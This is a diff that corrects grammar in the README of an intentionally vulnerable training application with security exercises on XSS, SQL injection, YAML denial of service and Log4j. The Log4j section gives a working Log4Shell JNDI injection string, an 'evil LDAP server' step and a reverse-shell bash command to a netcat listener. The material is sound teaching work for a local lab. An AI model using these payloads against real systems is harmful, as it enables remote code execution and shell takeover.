@@ -14,7 +14,7 @@ Now you have **2 options** to build and run the application
     ```
     docker-compose up --build
     ```
-- Run on you local machine if Java 8 and Maven are installed
+- Run on your local machine if Java 8 and Maven are installed
     ```
     mvn clean package
     mvn spring-boot:run
@@ -26,10 +26,10 @@ Username: admin
 Password: foobar
 
 ## Assignment 1
-### Cross site scripting
+### Cross-site scripting
 
-On the search page you can click on the username to show you more details
-This page is vulnerable to a Cross site scripting attack.
+You can click on the username on the search page to show you more details.
+This page is vulnerable to a cross-site scripting attack.
 ![DirectLink1](image/directlink.png)
 ![DirectLink2](image/directlink2.png)
 
@@ -54,7 +54,7 @@ This page is vulnerable to a Cross site scripting attack.
 ### SQL injection
 
 On the Search page, you can search the users by **username**.
-By using a `%` you can provide wildcards. For instance `Super%` will give you the result for **Superman**
+By using a `%` you can provide wildcards. For instance, `Super%` will give you the result for **Superman**
 Using the search term `%man`
 
 ![Search](image/search.png)
@@ -76,11 +76,11 @@ Using the search term `%man`
 ## Assignment 3
 ### Denial of Service
 
-Go to `import` to import new users using a yaml file
+Click on `import` to import new users using a YAML file.
 ![import](image/import.png)
 ![yaml](image/yaml.png)
 
-### 3a Upload 2 new users using a yaml file similar to this
+### 3a Upload 2 new users using a YAML file similar to this
 ```yaml
 user:
   -
@@ -112,16 +112,16 @@ user:
 ## Assignment 4 (Bonus assignment)
 ### Log4j
 
-For this exercise you need `netcat` installed on your local machine.
+For this exercise, you need `netcat` installed on your local machine.
 Also, you MUST run this application from a Docker container.
 
-This application uses a vulnerable version of log4j. We can use this to access a serialization gadget chain available in the classpath to execute commands
+This application uses a vulnerable version of log4j. We can use this to access a serialization gadget chain available in the classpath to execute commands.
 
 ### 4a go to the login screen and submit a wrong username / password combination
-You will notice that in the logs, an error statement is logged containing the username
+You will notice that in the logs, an error statement is logged containing the username.
 
 ### 4b startup the evil LDAP server
-From the root of the project do the following
+From the root of the project, do the following:
 
 ```
 cd exploits/log4shell-server/
@@ -130,16 +130,16 @@ mvn exec:java
 ```
 
 ### 4c Launch netcat
-In a new terminal window launch netcat listening to port 9001
+In a new terminal window launch Netcat listening to port 9001
 ```
 ncat -lvp 9001
 ```
 
 ### 4d launch the attack
-The exploit server will create serialize java payload containing a gadget chain that is available in the outdated apache `commons-collections` library.
+The exploit server will create a serialized java payload containing a gadget chain from the outdated Apache `commons-collections` library.
 This payload will try to execute following statement to create a reversed shell: `"$@| bash -i >& /dev/tcp/host.docker.internal/9001 0>&1"`
 
-From your docker container connect tot the LDAP server on you local machine
+From your Docker container, connect to the LDAP server on your local machine
 
 Use below as the username with any given password 
 ```
@@ -148,9 +148,8 @@ ${jndi:ldap://host.docker.internal:9999/Commons}
 
 
 
-If everything works out, you just executed a reverse shell command to port 9001
-Because you netcat is listening to this you now have shell access to that machine.
-The terminal you started netcat in should now look like similar to this.
+If everything works out, you just executed a reverse shell command to port 9001.
+Because your Netcat is listening to this, you now have shell access to that machine. The terminal you started Netcat in should now look similar to this.
 
 ![ncat](image/ncat.png)
 
